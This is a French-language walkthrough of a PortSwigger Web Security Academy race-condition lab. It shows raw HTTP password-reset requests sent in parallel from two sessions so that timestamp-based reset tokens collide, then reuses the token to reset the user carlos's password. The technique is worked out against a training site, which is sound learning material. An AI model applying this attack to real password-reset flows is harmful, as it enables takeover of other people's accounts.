# Lab

https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities

## Payload

On peut réinitialiser le mot de passe d'un utilisateur en fournissant son nom d'utilisateur et en cliquant sur le bouton "Reset password".

```
POST /forgot-password HTTP/2
Host: 0ad7009a0327f04f8099b81b001200ab.web-security-academy.net
Cookie: phpsessionid=sGSMcP4wpDeKSnoeWumsRgatT9rnDMfk
Content-Length: 53
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0ad7009a0327f04f8099b81b001200ab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad7009a0327f04f8099b81b001200ab.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

csrf=7bih2OtLgGsNqZNeHWRNBvIBoCgFOK6c&username=wiener
```

Il y a un jeton CSRF dans la requête. On peut le récupérer en faisant une requête GET sur la page de réinitialisation du mot de passe.

En mettant deux sessions PHP différentes et deux jetons CSRF valides dans deux requêtes différentes et en les lanceant en parallèle, on peut réinitialiser le mot de passe de l'utilisateur carlos et obtenir le même jeton de réinitialisation de mot de passe puisque le jeton se base sur un timestamp (on a pas l'info mais c'est un guess).

Ca ne fonctionne pas avec la même session PHP car il y surement un blocage / restriction par session ce qui empeche de faire des requêtes en parallèle pour le même utilisateur.

```
POST /forgot-password HTTP/2
Host: 0ad7009a0327f04f8099b81b001200ab.web-security-academy.net
Cookie: phpsessionid=sGSMcP4wpDeKSnoeWumsRgatT9rnDMfk
Content-Length: 53
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0ad7009a0327f04f8099b81b001200ab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad7009a0327f04f8099b81b001200ab.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

csrf=7bih2OtLgGsNqZNeHWRNBvIBoCgFOK6c&username=wiener
```

```
POST /forgot-password HTTP/2
Host: 0ad7009a0327f04f8099b81b001200ab.web-security-academy.net
Cookie: phpsessionid=x6yUZis5id2FmZ8OE7wLzfblYYi14QQx
Content-Length: 53
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://0ad7009a0327f04f8099b81b001200ab.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad7009a0327f04f8099b81b001200ab.web-security-academy.net/forgot-password
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

csrf=ZQvEEvPWUmt0evGk52apjkL7T6Elrg6l&username=carlos
```

Ca nous donne une URL : `https://0ad7009a0327f04f8099b81b001200ab.web-security-academy.net/forgot-password?user=wiener&token=80757efc3fb402d20338ef11444f292cb0a6e80b`.

Le jeton doit être le même si uniquement un timestamp est utilisé pour le générer.

On a juste a changer le nom d'utilisateur dans l'URL pour réinitialiser le mot de passe de l'utilisateur carlos.

`https://0ad7009a0327f04f8099b81b001200ab.web-security-academy.net/forgot-password?user=carlos&token=80757efc3fb402d20338ef11444f292cb0a6e80b`.